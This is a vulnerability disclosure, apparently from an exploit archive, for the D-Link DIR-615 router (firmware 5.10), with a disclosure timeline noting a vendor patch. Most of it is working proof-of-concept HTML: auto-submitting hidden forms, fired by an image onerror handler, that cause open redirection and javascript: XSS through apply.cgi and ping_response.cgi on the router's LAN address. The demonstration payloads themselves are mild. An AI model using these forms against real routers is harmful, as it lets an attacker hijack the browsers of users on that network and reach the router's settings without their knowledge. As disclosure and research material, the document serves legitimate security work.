@@ -1,0 +1,83 @@
+# Title:            D-Link DIR-615 Multiple Vulnerabilities
+# Date:             10-01-2017
+# Hardware Version: E3
+# Firmware Version: 5.10
+# Tested on:        Windows 8 64-bit
+# Exploit Author:   Osanda Malith Jayathissa (@OsandaMalith)
+# Original write-up:https://osandamalith.com/2017/01/04/d-link-dir-615-open-redirection-and-xss/
+
+Overview
+--------
+
+The 'apply.cgi' file was vulnerable to Open Redirection and XSS. Inside the router many other cgi files too use this functionality in 'apply.cgi'. For example the 'ping_response.cgi' file.
+
+Open Redirection
+-----------------
+# apply.cgi
+
+<html>
+<!-- @OsandaMalith -->
+  <body>
+    <form action="http://192.168.0.1/apply.cgi" method="POST" id="exploit">
+      <input type="hidden" name="html&#95;response&#95;page" value="https&#58;&#47;&#47;google&#46;lk" />
+      <input type="hidden" name="html&#95;response&#95;return&#95;page" value="tools&#95;vct&#46;asp" />
+	<img src=x onerror="exploit.submit()"/>
+    </form>
+  </body>
+</html>
+
+# ping_response.cgi
+
+<html>
+<!-- @OsandaMalith -->
+  <body>
+    <form action="http://192.168.0.1/ping_response.cgi" method="POST" id="exploit">
+      <input type="hidden" name="html&#95;response&#95;page" value="https&#58;&#47;&#47;google&#46;lk" />
+      <input type="hidden" name="html&#95;response&#95;return&#95;page" value="tools&#95;vct&#46;asp" />
+      <input type="hidden" name="ping&#95;ipaddr" value="192&#46;168&#46;0&#46;101" />
+      <input type="hidden" name="ping" value="Ping" />
+	<img src=x onerror="exploit.submit()"/>
+    </form>
+  </body>
+</html>
+
+
+POST XSS
+---------
+
+# apply.cgi
+
+<html>
+<!-- @OsandaMalith -->
+  <body>
+    <form action="http://192.168.0.1/apply.cgi" method="POST" id="exploit">
+      <input type="hidden" name="html&#95;response&#95;page" value="javascript&#58;confirm&#40;&#47;&#64;OsandaMalith&#47;&#41;" />
+      <input type="hidden" name="html&#95;response&#95;return&#95;page" value="tools&#95;vct&#46;asp" />
+	<img src=x onerror="exploit.submit()"/>
+    </form>
+  </body>
+</html>
+
+
+# ping_response.cgi
+
+<html>
+  <!-- @OsandaMalith -->
+  <body>
+    <form action="http://192.168.0.1/ping_response.cgi" method="POST" id="exploit">
+      <input type="hidden" name="html&#95;response&#95;page" value="javascript&#58;confirm&#40;&#47;&#64;OsandaMalith&#47;&#41;" />
+      <input type="hidden" name="html&#95;response&#95;return&#95;page" value="tools&#95;vct&#46;asp" />
+      <input type="hidden" name="ping&#95;ipaddr" value="127&#46;0&#46;0&#46;1" />
+      <input type="hidden" name="ping" value="Ping" />
+      <img src=x onerror="exploit.submit()"/>
+    </form>
+  </body>
+</html>
+
+
+Disclosure Timeline
+--------------------
+
+12/19/16: Reported to D-Link
+12/21/16: Security Patch released
+ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-615/REVT/DIR-615_REVT_RELEASE_NOTES_20.12PTb01.pdf
